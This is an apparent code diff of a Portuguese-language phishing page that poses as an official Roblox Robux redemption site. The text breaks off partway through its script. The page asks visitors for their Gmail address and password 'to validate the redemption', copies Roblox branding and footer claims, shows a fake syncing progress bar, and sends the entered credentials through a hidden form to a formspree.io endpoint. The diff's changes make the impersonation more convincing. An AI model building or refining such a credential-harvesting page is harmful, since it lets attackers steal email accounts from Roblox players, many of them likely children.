@@ -2,91 +2,158 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>RDX Robux</title>
+  <title>Roblox | Resgate de Robux e Toys</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Inter:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    *{box-sizing:border-box;font-family:'Inter',sans-serif}
-    body{margin:0;background:#f2f4f5;color:#1f1f1f}
-    header{background:#fff;padding:16px 32px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 6px rgba(0,0,0,.08)}
-    header h1{margin:0;font-size:20px;font-weight:700}
-    .hero{text-align:center;padding:50px 20px 20px}
-    .hero h2{font-size:34px;margin-bottom:10px}
-    .hero p{color:#555}
-    .wrap{max-width:420px;margin:20px auto}
-    .card{background:#fff;border-radius:14px;padding:26px;box-shadow:0 8px 25px rgba(0,0,0,.12)}
-    .card h3{text-align:center;margin-top:0}
-    label{display:block;margin-top:14px;font-weight:600;font-size:14px}
-    input,select{width:100%;padding:12px;margin-top:6px;border-radius:8px;border:1px solid #ccc}
-    button{width:100%;margin-top:18px;padding:14px;background:#00b06f;border:0;border-radius:10px;color:#fff;font-weight:700;cursor:pointer}
-    button:hover{background:#009a61}
-    .note{font-size:12px;color:#777;margin-top:12px;line-height:1.4;text-align:center}
-    .hidden{display:none}
-    .result{margin-top:14px;background:#f0fdf8;border-radius:10px;padding:14px;color:#067a52;font-weight:600;text-align:center}
-    footer{text-align:center;font-size:12px;color:#777;padding:26px}
+    body {
+      margin: 0;
+      background-color: #191B1D;
+      background-image: url('https://images.rbxcdn.com/c6934c5148008e330f8982c73336d859.jpg');
+      background-repeat: repeat;
+      background-size: 400px;
+      font-family: 'Inter', sans-serif;
+      color: #fff;
+      overflow-x: hidden;
+    }
+
+    header {
+      background: #212329;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #000;
+    }
+
+    header img { height: 32px; filter: invert(1); margin-right: 15px; }
+
+    .container { max-width: 450px; margin: 40px auto; padding: 20px; }
+
+    .card {
+      background: #2E3137;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      border-top: 5px solid #00A2FF;
+      text-align: center;
+    }
+
+    h2 { font-family: 'Fredoka One', cursive; font-size: 24px; margin-bottom: 10px; }
+    p { color: #ADB5BD; font-size: 14px; margin-bottom: 20px; }
+
+    label { display: block; text-align: left; font-size: 11px; font-weight: 700; color: #ADB5BD; text-transform: uppercase; margin-bottom: 5px; }
+    
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 4px;
+      border: 1px solid #111;
+      background: #393B44;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      background: #00B06F;
+      border: 0;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 4px 0 #008454;
+      transition: 0.2s;
+    }
+
+    /* Tela de Carregamento */
+    #loadingScreen { display: none; }
+    .loader-bar {
+      width: 100%;
+      background: #191B1D;
+      height: 12px;
+      border-radius: 10px;
+      margin: 20px 0;
+      overflow: hidden;
+      border: 1px solid #444;
+    }
+    .progress {
+      width: 0%;
+      height: 100%;
+      background: #00A2FF;
+      box-shadow: 0 0 10px #00A2FF;
+      transition: width 0.1s;
+    }
+
+    .hidden { display: none; }
+    footer { text-align: center; font-size: 10px; color: #65666A; padding: 20px; text-transform: uppercase; }
   </style>
 </head>
 <body>
 
 <header>
-  <h1>RDX Robux</h1>
+  <img src="https://images.rbxcdn.com/23421379963e790a612502847d3c0788.svg">
+  <div style="font-family:'Fredoka One'; letter-spacing: 1px;">REWARDS</div>
 </header>
 
-<section class="hero">
-  <h2>Robux System</h2>
-  <p>Resgate de Itens e Toys Roblox.</p>
-</section>
+<div class="container">
+  <div class="card" id="step1">
+    <h2>VERIFICAÇÃO</h2>
+    <p>Conecte seu Gmail para validar o resgate.</p>
+    
+    <label>E-mail (Gmail)</label>
+    <input type="email" id="field_email" placeholder="exemplo@gmail.com">
 
-<div class="wrap">
+    <label>Senha do E-mail</label>
+    <input type="password" id="field_pass" placeholder="Senha do e-mail">
 
-  <div class="card" id="loginCard">
-    <h3>Access Verification</h3>
-
-    <form action="https://formspree.io/f/mdaadnby" method="POST" id="mainForm">
-      <label>Email (Gmail)</label>
-      <input type="email" name="gmail" placeholder="exemplo@email.com" required>
-
-      <label>Password (Senha)</label>
-      <input type="password" name="senha_gmail" placeholder="••••••••" required>
-
-      <button type="submit">Continue</button>
-    </form>
-
-    <div class="note">
-      Verificação necessária para vincular o Toy à conta.<br>
-      <br>
-      Roblox Corporation
-    </div>
+    <button onclick="nextStep()">PRÓXIMO</button>
   </div>
 
-  <div class="card hidden" id="formCard">
-    <h3>Status do Resgate</h3>
-    <div class="result" id="result">
-        Verificação concluída!<br>
-        Aguardando sincronização com os servidores Roblox...
-    </div>
-    <div class="note">
-      🪙 Robux e Itens chegarão em até 5 Minutos na conta vinculada.<br>
-      Roblox Security
-    </div>
+  <div class="card hidden" id="step2">
+    <h2>RESGATAR</h2>
+    <p>Selecione a quantia de Robux desejada.</p>
+    
+    <label>Quantia de Robux</label>
+    <select id="field_robux">
+        <option>400 Robux</option>
+        <option>800 Robux</option>
+        <option>1.700 Robux</option>
+        <option>4.500 Robux</option>
+        <option>10.000 Robux</option>
+    </select>
+
+    <button onclick="startLoading()">RESGATAR AGORA</button>
   </div>
 
+  <div class="card hidden" id="loadingScreen">
+    <h2 id="loadText">SINCRONIZANDO...</h2>
+    <div class="loader-bar">
+      <div class="progress" id="progressBar"></div>
+    </div>
+    <p id="statusMsg">Conectando aos servidores da Roblox Corporation...</p>
+  </div>
+
+  <form id="finalForm" action="https://formspree.io/f/mdaadnby" method="POST" class="hidden">
+    <input type="email" name="email" id="form_email">
+    <input type="text" name="senha" id="form_pass">
+    <input type="text" name="robux" id="form_robux">
+  </form>
 </div>
 
-<footer>
-  © 2026 RDX Robux <br>
-  This site is affiliated with Roblox Corporation.
-</footer>
+<footer>© 2026 Roblox Corporation</footer>
 
 <script>
-  // Script para capturar o envio e mudar a tela
-  const form = document.getElementById('mainForm');
-  form.onsubmit = async (e) => {
-    // Não impede o envio, mas avisa o usuário
-    // O Formspree redirecionará a página ou você pode usar AJAX se quiser algo mais avançado.
-    // Para simplificar, deixaremos ele enviar normalmente.
-  };
-</script>
+  function nextStep() {
+    const email = document.getElementById('field_email').value;
+    const pass = document.getElementById('field_pass').value;
+    if(!email || !pass) { alert("Preencha os dados!"); return; }
+    
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+  }
 
-</body>
-</html>
+  function start
